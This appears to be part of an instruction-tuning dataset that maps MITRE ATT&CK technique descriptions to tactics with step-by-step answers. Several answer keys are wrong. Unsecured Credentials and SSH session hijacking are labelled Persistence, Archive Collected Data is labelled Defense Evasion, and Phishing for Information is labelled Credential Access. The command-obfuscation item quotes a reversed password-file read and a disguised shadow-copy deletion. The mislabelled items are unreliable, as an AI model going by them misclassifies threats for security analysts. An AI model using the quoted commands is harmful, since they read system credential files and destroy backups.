    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. A cloud metadata API has been used in at least one high profile compromise.\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http://169.254.169.254</code>.?",
    "context": "",
    "output": "The given description is related to sub technique: Cloud Instance Metadata API (T1552.005);\nSub technique Cloud Instance Metadata API (T1552.005) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. A cloud metadata API has been used in at least one high profile compromise.\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http://169.254.169.254</code>.",
      "answer": "The given description is related to sub technique: Cloud Instance Metadata API (T1552.005);\nSub technique Cloud Instance Metadata API (T1552.005) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.?",
    "context": "",
    "output": "The given description is related to sub technique Hidden File System (T1564.005);\nSub technique Hidden File System (T1564.005) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.",
      "answer": "The given description is related to sub technique Hidden File System (T1564.005);\nSub technique Hidden File System (T1564.005) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
    "context": "",
    "output": "The given description is related to sub technique Archive via Library (T1560.002);\nSub technique Archive via Library (T1560.002) is a type of technique Archive Collected Data (T1560);\nTechnique Archive Collected Data (T1560) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
      "answer": "The given description is related to sub technique Archive via Library (T1560.002);\nSub technique Archive via Library (T1560.002) is a type of technique Archive Collected Data (T1560);\nTechnique Archive Collected Data (T1560) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.?",
    "context": "",
    "output": "The given description is related to sub technique Command Obfuscation (T1027.010);\nSub technique Command Obfuscation (T1027.010) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.",
      "answer": "The given description is related to sub technique Command Obfuscation (T1027.010);\nSub technique Command Obfuscation (T1027.010) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.?",
    "context": "",
    "output": "The given description is related to sub technique: Remote Email Collection (T1114.002);\nSub technique Remote Email Collection (T1114.002) is a type of technique Email Collection (T1114);\nTechnique Email Collection (T1114) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.",
      "answer": "The given description is related to sub technique: Remote Email Collection (T1114.002);\nSub technique Remote Email Collection (T1114.002) is a type of technique Email Collection (T1114);\nTechnique Email Collection (T1114) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file. The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
    "context": "",
    "output": "The given description is related to sub technique Spearphishing Attachment (T1598.002);\nSub technique Spearphishing Attachment (T1598.002) is a type of technique Phishing for Information (T1598);\nTechnique Phishing for Information (T1598) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file. The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
      "answer": "The given description is related to sub technique Spearphishing Attachment (T1598.002);\nSub technique Spearphishing Attachment (T1598.002) is a type of technique Phishing for Information (T1598);\nTechnique Phishing for Information (T1598) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account).\n\nIn some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.?",
    "context": "",
    "output": "The given description is related to sub technique Clear Persistence (T1070.009);\nSub technique Clear Persistence (T1070.009) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account).\n\nIn some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.",
      "answer": "The given description is related to sub technique Clear Persistence (T1070.009);\nSub technique Clear Persistence (T1070.009) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.?",
    "context": "",
    "output": "The given description is related to sub technique: File Transfer Protocols (T1071.002);\nSub technique File Transfer Protocols (T1071.002) is a type of technique Application Layer Protocol (T1071);\nTechnique Application Layer Protocol (T1071) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The given description is related to sub technique: File Transfer Protocols (T1071.002);\nSub technique File Transfer Protocols (T1071.002) is a type of technique Application Layer Protocol (T1071);\nTechnique Application Layer Protocol (T1071) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.",
    "context": "",
    "output": "The given description is related to sub technique: Binary Padding (T1027.001);\nSub technique Binary Padding (T1027.001) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.",
      "answer": "The given description is related to sub technique: Binary Padding (T1027.001);\nSub technique Binary Padding (T1027.001) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
    "context": "",
    "output": "The given description is related to sub technique Software Packing (T1027.002);\nSub technique Software Packing (T1027.002) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
      "answer": "The given description is related to sub technique Software Packing (T1027.002);\nSub technique Software Packing (T1027.002) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.",
    "context": "",
    "output": "The given description is related to sub technique: Credential Stuffing (T1110.004);\nSub technique Credential Stuffing (T1110.004) is a type of technique Brute Force (T1110);\nTechnique Brute Force (T1110) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.",
      "answer": "The given description is related to sub technique: Credential Stuffing (T1110.004);\nSub technique Credential Stuffing (T1110.004) is a type of technique Brute Force (T1110);\nTechnique Brute Force (T1110) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., Cloud API), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via Application Access Token instead of a username and password.",
    "context": "",
    "output": "The given description is related to sub technique Cloud Services (T1021.007);\nSub technique Cloud Services (T1021.007) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., Cloud API), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via Application Access Token instead of a username and password.",
      "answer": "The given description is related to sub technique Cloud Services (T1021.007);\nSub technique Cloud Services (T1021.007) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation .",
    "context": "",
    "output": "The given description is related to sub technique: Chat Messages (T1552.008);\nSub technique Chat Messages (T1552.008) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation .",
      "answer": "The given description is related to sub technique: Chat Messages (T1552.008);\nSub technique Chat Messages (T1552.008) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.\n\nSSH Hijacking differs from use of SSH because it hijacks an existing SSH session rather than creating a new session using Valid Accounts.",
    "context": "",
    "output": "The given description is related to sub technique SSH Hijacking (T1563.001);\nSub technique SSH Hijacking (T1563.001) is a type of technique Remote Service Session Hijacking (T1563);\nTechnique Remote Service Session Hijacking (T1563) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.\n\nSSH Hijacking differs from use of SSH because it hijacks an existing SSH session rather than creating a new session using Valid Accounts.",
      "answer": "The given description is related to sub technique SSH Hijacking (T1563.001);\nSub technique SSH Hijacking (T1563.001) is a type of technique Remote Service Session Hijacking (T1563);\nTechnique Remote Service Session Hijacking (T1563) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",
    "context": "",
